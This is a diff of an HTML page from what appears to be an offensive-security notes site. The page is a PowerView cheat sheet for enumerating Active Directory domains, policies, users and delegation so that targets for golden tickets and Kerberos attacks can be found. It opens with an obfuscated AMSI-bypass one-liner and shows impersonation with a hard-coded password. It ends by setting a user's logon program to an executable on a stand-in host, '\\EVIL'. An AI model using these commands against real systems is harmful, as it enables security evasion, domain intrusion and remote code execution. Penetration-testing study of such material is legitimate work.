@@ -10,363 +10,363 @@ Domain Persistence</button><div class=collapse id=section-domain_persistence><ul
 Lateral Movement</button><div class=collapse id=section-lateral_movement><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/active_directory/lateral_movement/ps_remoting/>PowerShell Remoting</a></li><li><a class="docs-link rounded" href=/active_directory/lateral_movement/credential_dumping/>Credential Dumping</a></li><li><a class="docs-link rounded" href=/active_directory/lateral_movement/dc_sync/>DC Sync</a></li><li><a class="docs-link rounded" href=/active_directory/lateral_movement/overpass_the_hash/>Overpass-the-Hash</a></li><li><a class="docs-link rounded" href=/active_directory/lateral_movement/ticket_harvesting/>Ticket Harvesting</a></li><li><a class="docs-link rounded" href=/active_directory/lateral_movement/pass_the_ticket/>Pass-the-Ticket</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-trust_attacks aria-expanded=false>
 Trust Attacks</button><div class=collapse id=section-trust_attacks><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/active_directory/trust_attacks/cross_domain_attacks/>Cross-Domain Attacks</a></li><li><a class="docs-link rounded" href=/active_directory/trust_attacks/cross_forest_attacks/>Cross-Forest Attacks</a></li><li><a class="docs-link rounded" href=/active_directory/trust_attacks/mssql_servers/>MS-SQL Servers</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-mitm_relay aria-expanded=false>
 MITM & Relay Attacks</button><div class=collapse id=section-mitm_relay><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/active_directory/mitm_relay/llmnr_poisoning/>LLMNR Poisoning</a></li><li><a class="docs-link rounded" href=/active_directory/mitm_relay/ipv6_attacks/>IPv6 Attacks</a></li><li><a class="docs-link rounded" href=/active_directory/mitm_relay/smb_relay/>SMB Relay</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-detection_and_defense aria-expanded=false>
-Detection & Defense</button><div class=collapse id=section-detection_and_defense><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/active_directory/detection_and_defense/architectural_changes/>Architectural Changes</a></li><li><a class="docs-link rounded" href=/active_directory/detection_and_defense/domain_admins/>Domain Admins</a></li><li><a class="docs-link rounded" href=/active_directory/detection_and_defense/microsoft_ata/>Microsoft Advanced Threat Analytics (ATA)</a></li></ul></div></li></ul></nav></div><nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#loading-powerview>Loading PowerView</a></li><li><a href=#domains>Domains</a></li><li><a href=#users>Users</a></li><li><a href=#computers>Computers</a></li><li><a href=#groups>Groups</a></li><li><a href=#files--shares>Files & Shares</a></li><li><a href=#group-policy>Group Policy</a></li><li><a href=#organizational-units>Organizational Units</a></li><li><a href=#access-control-lists>Access Control Lists</a></li><li><a href=#trusts>Trusts</a></li><li><a href=#forest-mapping>Forest Mapping</a></li><li><a href=#user-hunting>User Hunting</a><ul><li><a href=#defending-against-user-hunting>Defending against User Hunting</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><h1>PowerView</h1><p class=lead>Enumeration of the domain, users, groups, and computers using PowerView.</p><nav class=d-xl-none aria-label="Quaternary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#loading-powerview>Loading PowerView</a></li><li><a href=#domains>Domains</a></li><li><a href=#users>Users</a></li><li><a href=#computers>Computers</a></li><li><a href=#groups>Groups</a></li><li><a href=#files--shares>Files & Shares</a></li><li><a href=#group-policy>Group Policy</a></li><li><a href=#organizational-units>Organizational Units</a></li><li><a href=#access-control-lists>Access Control Lists</a></li><li><a href=#trusts>Trusts</a></li><li><a href=#forest-mapping>Forest Mapping</a></li><li><a href=#user-hunting>User Hunting</a><ul><li><a href=#defending-against-user-hunting>Defending against User Hunting</a></li></ul></li></ul></nav></div></nav><h2 id=loading-powerview>Loading PowerView <a href=#loading-powerview class=anchor aria-hidden=true>#</a></h2><pre><code class=language-powershell># If it gets blocked by AMSI we can bypass it with
-S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
+Detection & Defense</button><div class=collapse id=section-detection_and_defense><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=/active_directory/detection_and_defense/architectural_changes/>Architectural Changes</a></li><li><a class="docs-link rounded" href=/active_directory/detection_and_defense/domain_admins/>Domain Admins</a></li><li><a class="docs-link rounded" href=/active_directory/detection_and_defense/microsoft_ata/>Microsoft Advanced Threat Analytics (ATA)</a></li></ul></div></li></ul></nav></div><nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#loading-powerview>Loading PowerView</a></li><li><a href=#domains>Domains</a></li><li><a href=#users>Users</a></li><li><a href=#computers>Computers</a></li><li><a href=#groups>Groups</a></li><li><a href=#files--shares>Files & Shares</a></li><li><a href=#group-policy>Group Policy</a></li><li><a href=#organizational-units>Organizational Units</a></li><li><a href=#access-control-lists>Access Control Lists</a></li><li><a href=#trusts>Trusts</a></li><li><a href=#forest-mapping>Forest Mapping</a></li><li><a href=#user-hunting>User Hunting</a><ul><li><a href=#defending-against-user-hunting>Defending against User Hunting</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><h1>PowerView</h1><p class=lead>Enumeration of the domain, users, groups, and computers using PowerView.</p><nav class=d-xl-none aria-label="Quaternary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#loading-powerview>Loading PowerView</a></li><li><a href=#domains>Domains</a></li><li><a href=#users>Users</a></li><li><a href=#computers>Computers</a></li><li><a href=#groups>Groups</a></li><li><a href=#files--shares>Files & Shares</a></li><li><a href=#group-policy>Group Policy</a></li><li><a href=#organizational-units>Organizational Units</a></li><li><a href=#access-control-lists>Access Control Lists</a></li><li><a href=#trusts>Trusts</a></li><li><a href=#forest-mapping>Forest Mapping</a></li><li><a href=#user-hunting>User Hunting</a><ul><li><a href=#defending-against-user-hunting>Defending against User Hunting</a></li></ul></li></ul></nav></div></nav><h2 id=loading-powerview>Loading PowerView <a href=#loading-powerview class=anchor aria-hidden=true>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># If it gets blocked by AMSI we can bypass it with</span>
+S`<span style=color:#8be9fd;font-style:italic>eT-It</span>`em ( <span style=color:#f1fa8c>&#39;V&#39;</span>+<span style=color:#f1fa8c>&#39;aR&#39;</span> +  <span style=color:#f1fa8c>&#39;IA&#39;</span> + (<span style=color:#f1fa8c>&#39;blE:1&#39;</span>+<span style=color:#f1fa8c>&#39;q2&#39;</span>)  + (<span style=color:#f1fa8c>&#39;uZ&#39;</span>+<span style=color:#f1fa8c>&#39;x&#39;</span>)  ) ( [TYpE](  <span style=color:#f1fa8c>&#34;{1}{0}&#34;</span><span style=color:#ff79c6>-F</span><span style=color:#f1fa8c>&#39;F&#39;</span>,<span style=color:#f1fa8c>&#39;rE&#39;</span>  ) )  ;    (    <span style=color:#8be9fd;font-style:italic>Get-varI</span>`A`BLE  ( (<span style=color:#f1fa8c>&#39;1Q&#39;</span>+<span style=color:#f1fa8c>&#39;2U&#39;</span>)  +<span style=color:#f1fa8c>&#39;zX&#39;</span>  )  -VaL  ).<span style=color:#f1fa8c>&#34;A`ss`Embly&#34;</span>.<span style=color:#f1fa8c>&#34;GET</span><span style=color:#f1fa8c>`T</span><span style=color:#f1fa8c>Y`Pe&#34;</span>((  <span style=color:#f1fa8c>&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span> <span style=color:#ff79c6>-f</span>(<span style=color:#f1fa8c>&#39;Uti&#39;</span>+<span style=color:#f1fa8c>&#39;l&#39;</span>),<span style=color:#f1fa8c>&#39;A&#39;</span>,(<span style=color:#f1fa8c>&#39;Am&#39;</span>+<span style=color:#f1fa8c>&#39;si&#39;</span>),(<span style=color:#f1fa8c>&#39;.Man&#39;</span>+<span style=color:#f1fa8c>&#39;age&#39;</span>+<span style=color:#f1fa8c>&#39;men&#39;</span>+<span style=color:#f1fa8c>&#39;t.&#39;</span>),(<span style=color:#f1fa8c>&#39;u&#39;</span>+<span style=color:#f1fa8c>&#39;to&#39;</span>+<span style=color:#f1fa8c>&#39;mation.&#39;</span>),<span style=color:#f1fa8c>&#39;s&#39;</span>,(<span style=color:#f1fa8c>&#39;Syst&#39;</span>+<span style=color:#f1fa8c>&#39;em&#39;</span>)  ) ).<span style=color:#f1fa8c>&#34;g`etf`iElD&#34;</span>(  ( <span style=color:#f1fa8c>&#34;{0}{2}{1}&#34;</span> <span style=color:#ff79c6>-f</span>(<span style=color:#f1fa8c>&#39;a&#39;</span>+<span style=color:#f1fa8c>&#39;msi&#39;</span>),<span style=color:#f1fa8c>&#39;d&#39;</span>,(<span style=color:#f1fa8c>&#39;I&#39;</span>+<span style=color:#f1fa8c>&#39;nitF&#39;</span>+<span style=color:#f1fa8c>&#39;aile&#39;</span>)  ),(  <span style=color:#f1fa8c>&#34;{2}{4}{0}{1}{3}&#34;</span> <span style=color:#ff79c6>-f</span> (<span style=color:#f1fa8c>&#39;S&#39;</span>+<span style=color:#f1fa8c>&#39;tat&#39;</span>),<span style=color:#f1fa8c>&#39;i&#39;</span>,(<span style=color:#f1fa8c>&#39;Non&#39;</span>+<span style=color:#f1fa8c>&#39;Publ&#39;</span>+<span style=color:#f1fa8c>&#39;i&#39;</span>),<span style=color:#f1fa8c>&#39;c&#39;</span>,<span style=color:#f1fa8c>&#39;c,&#39;</span>  )).<span style=color:#f1fa8c>&#34;sE</span><span style=color:#f1fa8c>`T`V</span><span style=color:#f1fa8c>aLUE&#34;</span>(  ${n`ULl},${t`RuE} )
 
-# Then load the module
-Import-Module .\PowerView.ps1
+<span style=color:#6272a4># Then load the module</span>
+<span style=color:#8be9fd;font-style:italic>Import-Module</span> .\PowerView.ps1
 . .\PowerView.ps1
-</code></pre><h2 id=domains>Domains <a href=#domains class=anchor aria-hidden=true>#</a></h2><ul><li>General domain information</li><li>Password policy</li><li>Ticket policy, interesting for crafting appropriate golden/silver tickets</li><li>List of domain controllers and HVTs</li></ul><pre><code class=language-powershell># Get current domain
-Get-NetDomain
+</code></pre></div><h2 id=domains>Domains <a href=#domains class=anchor aria-hidden=true>#</a></h2><ul><li>General domain information</li><li>Password policy</li><li>Ticket policy, interesting for crafting appropriate golden/silver tickets</li><li>List of domain controllers and HVTs</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Get current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetDomain</span>
 
-# Get object of another domain
-Get-NetDomain -Domain lab.local
+<span style=color:#6272a4># Get object of another domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetDomain</span> -Domain lab.local
 
-# Get domain SID for current domain
-Get-DomainSID
+<span style=color:#6272a4># Get domain SID for current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainSID</span>
 
-# Get domain policy for current domain
-Get-DomainPolicy
-(Get-DomainPolicy).&quot;System Access&quot;
+<span style=color:#6272a4># Get domain policy for current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainPolicy</span>
+(<span style=color:#8be9fd;font-style:italic>Get-DomainPolicy</span>).<span style=color:#f1fa8c>&#34;System Access&#34;</span>
 
-# Get domain policy for another domain
-# Password policy
-(Get-DomainPolicy -Domain lab.local).&quot;System Access&quot;
+<span style=color:#6272a4># Get domain policy for another domain</span>
+<span style=color:#6272a4># Password policy</span>
+(<span style=color:#8be9fd;font-style:italic>Get-DomainPolicy</span> -Domain lab.local).<span style=color:#f1fa8c>&#34;System Access&#34;</span>
 
-# Kerberos policy for e.g. mimikatz golden tickets
-(Get-DomainPolicy -Domain lab.local).&quot;Kerberos Policy&quot;
+<span style=color:#6272a4># Kerberos policy for e.g. mimikatz golden tickets</span>
+(<span style=color:#8be9fd;font-style:italic>Get-DomainPolicy</span> -Domain lab.local).<span style=color:#f1fa8c>&#34;Kerberos Policy&#34;</span>
 
-# Get domain controllers for current domain
-Get-NetDomainController
+<span style=color:#6272a4># Get domain controllers for current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetDomainController</span>
 
-# Get domain controllers for another domain
-Get-NetDomainController -Domain lab.local
+<span style=color:#6272a4># Get domain controllers for another domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetDomainController</span> -Domain lab.local
 
-# enumerate all gobal catalogs in the forest
-Get-ForestGlobalCatalog
+<span style=color:#6272a4># enumerate all gobal catalogs in the forest</span>
+<span style=color:#8be9fd;font-style:italic>Get-ForestGlobalCatalog</span>
 
-# Turn a list of computer short names to FQDNs, using a global catalog
-gc computers.txt | % {Get-DomainComputer -SearchBase &quot;GC://GLOBAL.CATALOG&quot; -LDAP &quot;(name=$_)&quot; -Properties dnshostname}
+<span style=color:#6272a4># Turn a list of computer short names to FQDNs, using a global catalog</span>
+<span style=color:#8be9fd;font-style:italic>gc </span>computers.txt | % {<span style=color:#8be9fd;font-style:italic>Get-DomainComputer</span> -SearchBase <span style=color:#f1fa8c>&#34;GC://GLOBAL.CATALOG&#34;</span> -LDAP <span style=color:#f1fa8c>&#34;(name=$_)&#34;</span> -Properties dnshostname}
 
-# Enumerate the current domain controller policy
-$DCPolicy = Get-DomainPolicy -Policy DC
-$DCPolicy.PrivilegeRights # user privilege rights on the dc...
+<span style=color:#6272a4># Enumerate the current domain controller policy</span>
+<span style=color:#8be9fd;font-style:italic>$DCPolicy</span> = <span style=color:#8be9fd;font-style:italic>Get-DomainPolicy</span> -Policy DC
+<span style=color:#8be9fd;font-style:italic>$DCPolicy</span>.PrivilegeRights <span style=color:#6272a4># user privilege rights on the dc...</span>
 
-# Enumerate the current domain policy
-$DomainPolicy = Get-DomainPolicy -Domain bufu-sec.local
-$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
-$DomainPolicy.SystemAccess # password age/etc.
-</code></pre><h2 id=users>Users <a href=#users class=anchor aria-hidden=true>#</a></h2><ul><li>List of users</li><li>Inactive users</li><li>Possible honeypot users with very low logon counts</li></ul><pre><code class=language-powershell># Get list of users in current domain
-Get-NetUser
-Get-NetUser -Username student1
-Get-NetUser | Select cn
+<span style=color:#6272a4># Enumerate the current domain policy</span>
+<span style=color:#8be9fd;font-style:italic>$DomainPolicy</span> = <span style=color:#8be9fd;font-style:italic>Get-DomainPolicy</span> -Domain <span style=color:#8be9fd;font-style:italic>bufu-sec</span>.local
+<span style=color:#8be9fd;font-style:italic>$DomainPolicy</span>.KerberosPolicy <span style=color:#6272a4># useful for golden tickets ;)</span>
+<span style=color:#8be9fd;font-style:italic>$DomainPolicy</span>.SystemAccess <span style=color:#6272a4># password age/etc.</span>
+</code></pre></div><h2 id=users>Users <a href=#users class=anchor aria-hidden=true>#</a></h2><ul><li>List of users</li><li>Inactive users</li><li>Possible honeypot users with very low logon counts</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#6272a4># Get list of users in current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetUser</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetUser</span> -Username student1
+<span style=color:#8be9fd;font-style:italic>Get-NetUser</span> | <span style=color:#8be9fd;font-style:italic>Select </span>cn
 
-# Find all users with an SPN (likely service accounts)
-Get-DomainUser -SPN
+<span style=color:#6272a4># Find all users with an SPN (likely service accounts)</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -SPN
 
-# Find all service accounts in &quot;Domain Admins&quot;
-Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
+<span style=color:#6272a4># Find all service accounts in &#34;Domain Admins&#34;</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -SPN | ?{<span style=color:#8be9fd;font-style:italic>$_</span>.memberof <span style=color:#ff79c6>-match</span> <span style=color:#f1fa8c>&#39;Domain Admins&#39;</span>}
 
-# Check for users who don't have kerberos preauthentication set
-Get-DomainUser -PreauthNotRequired
-Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+<span style=color:#6272a4># Check for users who don&#39;t have kerberos preauthentication set</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -PreauthNotRequired
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -UACFilter DONT_REQ_PREAUTH
 
-# Find users with sidHistory set
-Get-DomainUser -LDAPFilter '(sidHistory=*)'
+<span style=color:#6272a4># Find users with sidHistory set</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -LDAPFilter <span style=color:#f1fa8c>&#39;(sidHistory=*)&#39;</span>
 
-# Find any users with constrained delegation set
-Get-DomainUser -TrustedToAuth
+<span style=color:#6272a4># Find any users with constrained delegation set</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -TrustedToAuth
 
-# Find all privileged users that aren't marked as sensitive/not for delegation
-Get-DomainUser -AllowDelegation -AdminCount
+<span style=color:#6272a4># Find all privileged users that aren&#39;t marked as sensitive/not for delegation</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -AllowDelegation -AdminCount
 
-# Get list of all properties for users in current domain
-Get-UserProperty
-Get-UserProperty -Properties pwdlastset
+<span style=color:#6272a4># Get list of all properties for users in current domain</span>
+<span style=color:#8be9fd;font-style:italic>Get-UserProperty</span>
+<span style=color:#8be9fd;font-style:italic>Get-UserProperty</span> -Properties pwdlastset
 
-# Search for a particular string in a user's attributes
-Find-UserField -SearchField Description -SearchTerm &quot;built&quot;
+<span style=color:#6272a4># Search for a particular string in a user&#39;s attributes</span>
+<span style=color:#8be9fd;font-style:italic>Find-UserField</span> -SearchField Description -SearchTerm <span style=color:#f1fa8c>&#34;built&#34;</span>
 
-# Get actively logged on users on a computer (needs local admin rights on the target)
-Get-NetLoggedOn -ComputerName dc.lab.local
+<span style=color:#6272a4># Get actively logged on users on a computer (needs local admin rights on the target)</span>
+<span style=color:#8be9fd;font-style:italic>Get-NetLoggedOn</span> -ComputerName dc.lab.local
 
-# Get actively logged on users on a computer (needs remote registry on the target - started by default on server OS)
-Get-LoggedOnLocal -ComputerName dc.lab.local
+<span style=color:#6272a4># Get actively logged on users on a computer (needs remote registry on the target - started by default on server OS)</span>
+<span style=color:#8be9fd;font-style:italic>Get-LoggedOnLocal</span> -ComputerName dc.lab.local
 
-# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
-Get-LastLoggedOn -ComputerName dc.lab.local
+<span style=color:#6272a4># Get the last logged user on a computer (needs administrative rights and remote registry on the target)</span>
+<span style=color:#8be9fd;font-style:italic>Get-LastLoggedOn</span> -ComputerName dc.lab.local
 
-# Get all users with passwords changed &gt; 1 year ago, returning sam account names and password last set times
-$Date = (Get-Date).AddYears(-1).ToFileTime()
-Get-DomainUser -LDAPFilter &quot;(pwdlastset&lt;=$Date)&quot; -Properties samaccountname,pwdlastset
+<span style=color:#6272a4># Get all users with passwords changed &gt; 1 year ago, returning sam account names and password last set times</span>
+<span style=color:#8be9fd;font-style:italic>$Date</span> = (<span style=color:#8be9fd;font-style:italic>Get-Date</span>).AddYears(-1).ToFileTime()
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -LDAPFilter <span style=color:#f1fa8c>&#34;(pwdlastset&lt;=$Date)&#34;</span> -Properties samaccountname,pwdlastset
 
-# Get all enabled users, returning distinguishednames
-Get-DomainUser -LDAPFilter &quot;(!userAccountControl:1.2.840.113556.1.4.803:=2)&quot; -Properties distinguishedname
-Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
+<span style=color:#6272a4># Get all enabled users, returning distinguishednames</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -LDAPFilter <span style=color:#f1fa8c>&#34;(!userAccountControl:1.2.840.113556.1.4.803:=2)&#34;</span> -Properties distinguishedname
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
 
-# Get all disabled users
-Get-DomainUser -LDAPFilter &quot;(userAccountControl:1.2.840.113556.1.4.803:=2)&quot;
-Get-DomainUser -UACFilter ACCOUNTDISABLE
+<span style=color:#6272a4># Get all disabled users</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -LDAPFilter <span style=color:#f1fa8c>&#34;(userAccountControl:1.2.840.113556.1.4.803:=2)&#34;</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -UACFilter ACCOUNTDISABLE
 
-# Get all users that require smart card authentication
-Get-DomainUser -LDAPFilter &quot;(useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot;
-Get-DomainUser -UACFilter SMARTCARD_REQUIRED
+<span style=color:#6272a4># Get all users that require smart card authentication</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -LDAPFilter <span style=color:#f1fa8c>&#34;(useraccountcontrol:1.2.840.113556.1.4.803:=262144)&#34;</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -UACFilter SMARTCARD_REQUIRED
 
-# Get all users that *don't* require smart card authentication, only returning sam account names
-Get-DomainUser -LDAPFilter &quot;(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot; -Properties samaccountname
-Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
+<span style=color:#6272a4># Get all users that *don&#39;t* require smart card authentication, only returning sam account names</span>
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -LDAPFilter <span style=color:#f1fa8c>&#34;(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)&#34;</span> -Properties samaccountname
+<span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
 
-# Use multiple identity types for any *-Domain* function
-'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
+<span style=color:#6272a4># Use multiple identity types for any *-Domain* function</span>
+<span style=color:#f1fa8c>&#39;S-1-5-21-890171859-3433809279-3366196753-1114&#39;</span>, <span style=color:#f1fa8c>&#39;CN=dfm,CN=Users,DC=testlab,DC=local&#39;</span>,<span style=color:#f1fa8c>&#39;4c435dd7-dc58-4b14-9a5e-1fdb0e80d201&#39;</span>,<span style=color:#f1fa8c>&#39;administrator&#39;</span> | <span style=color:#8be9fd;font-style:italic>Get-DomainUser</span> -Properties samaccountname,lastlogoff
 
-# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
-#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
-$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase &quot;GC://testlab.local&quot; -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
-$Domains = @{}
-$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
-    # extract the domain the foreign user was added to
-    $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-    # check if we've already enumerated this domain
-    if (-not $Domains[$ForeignUserDomain]) {
-        $Domains[$ForeignUserDomain] = $True
-        # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set
-        $Filter = &quot;(|(member=&quot; + $($ForeignUsers -join &quot;)(member=&quot;) + &quot;))&quot;
-        Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member
+<span style=color:#6272a4># enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships</span>
+<span style=color:#6272a4>#   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames</span>
+<span style=color:#8be9fd;font-style:italic>$ForeignUsers</span> = <span style=color:#8be9fd;font-style:italic>Get-DomainObject</span> -Properties objectsid,distinguishedname -SearchBase <span style=color:#f1fa8c>&#34;GC://testlab.local&#34;</span> -LDAPFilter <span style=color:#f1fa8c>&#39;(objectclass=foreignSecurityPrincipal)&#39;</span> | ? {<span style=color:#8be9fd;font-style:italic>$_</span>.objectsid <span style=color:#ff79c6>-match</span> <span style=color:#f1fa8c>&#39;^S-1-5-.*-[1-9]\d{2,}$&#39;</span>} | <span style=color:#8be9fd;font-style:italic>Select-Object</span> -ExpandProperty distinguishedname
+<span style=color:#8be9fd;font-style:italic>$Domains</span> = @{}
+<span style=color:#8be9fd;font-style:italic>$ForeignMemberships</span> = <span style=color:#ff79c6>ForEach</span>(<span style=color:#8be9fd;font-style:italic>$ForeignUser</span> <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>$ForeignUsers</span>) {
+    <span style=color:#6272a4># extract the domain the foreign user was added to</span>
+    <span style=color:#8be9fd;font-style:italic>$ForeignUserDomain</span> = <span style=color:#8be9fd;font-style:italic>$ForeignUser</span>.SubString(<span style=color:#8be9fd;font-style:italic>$ForeignUser</span>.IndexOf(<span style=color:#f1fa8c>&#39;DC=&#39;</span>)) <span style=color:#ff79c6>-replace</span> <span style=color:#f1fa8c>&#39;DC=&#39;</span>,<span style=color:#f1fa8c>&#39;&#39;</span> <span style=color:#ff79c6>-replace</span> <span style=color:#f1fa8c>&#39;,&#39;</span>,<span style=color:#f1fa8c>&#39;.&#39;</span>
+    <span style=color:#6272a4># check if we&#39;ve already enumerated this domain</span>
+    <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>-not</span> <span style=color:#8be9fd;font-style:italic>$Domains</span>[<span style=color:#8be9fd;font-style:italic>$ForeignUserDomain</span>]) {
+        <span style=color:#8be9fd;font-style:italic>$Domains</span>[<span style=color:#8be9fd;font-style:italic>$ForeignUserDomain</span>] = <span style=color:#8be9fd;font-style:italic>$True</span>
+        <span style=color:#6272a4># enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set</span>
+        <span style=color:#8be9fd;font-style:italic>$Filter</span> = <span style=color:#f1fa8c>&#34;(|(member=&#34;</span> + $(<span style=color:#8be9fd;font-style:italic>$ForeignUsers</span> -join <span style=color:#f1fa8c>&#34;)(member=&#34;</span>) + <span style=color:#f1fa8c>&#34;))&#34;</span>
+        <span style=color:#8be9fd;font-style:italic>Get-DomainGroup</span> -Domain <span style=color:#8be9fd;font-style:italic>$ForeignUserDomain</span> -Scope DomainLocal -LDAPFilter <span style=color:#8be9fd;font-style:italic>$Filter</span> -Properties distinguishedname,member
     }
 }
-$ForeignMemberships | fl
+<span style=color:#8be9fd;font-style:italic>$ForeignMemberships</span> | <span style=color:#8be9fd;font-style:italic>fl
+</span><span style=color:#8be9fd;font-style:italic></span>
+<span style=color:#6272a4># if running in -sta mode, impersonate another credential a la &#34;runas /netonly&#34;</span>
+<span style=color:#8be9fd;font-style:italic>$SecPassword</span> = <span style=color:#8be9fd;font-style:italic>ConvertTo-SecureString</span> <span style=color:#f1fa8c>&#39;Password123!&#39;</span> -AsPlainText -Force
+<span style=color:#8be9fd;font-style:italic>$Cred</span> = <span style=color:#8be9fd;font-style:italic>New-Object</span> System.Management.Automation.PSCredential(<span style=color:#f1fa8c>&#39;TESTLAB\dfm.a&#39;</span>, <span style=color:#8be9fd;font-style:italic>$SecPassword</span>)
+<span style=color:#8be9fd;font-style:italic>Invoke-UserImpersonation</span> -Credential <span style=color:#8be9fd;font-style:italic>$Cred</span>
+<span style=color:#6272a4># ... action</span>
+<span style=color:#8be9fd;font-style:italic>Invoke-RevertToSelf</span>
 
-# if running in -sta mode, impersonate another credential a la &quot;runas /netonly&quot;
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Invoke-UserImpersonation -Credential $Cred
-# ... action
-Invoke-RevertToSelf
+<span style=color:#6272a4># Set the specified property for the given user identity</span>
+<span style=color:#8be9fd;font-style:italic>Set-DomainObject</span> testuser -Set @{<span style=color:#f1fa8c>&#39;mstsinitialprogram&#39;</span>=<span style=color:#f1fa8c>&#39;\\EVIL\program.exe&#39;</span>} -Verbose
 
-# Set the specified property for the given user identity
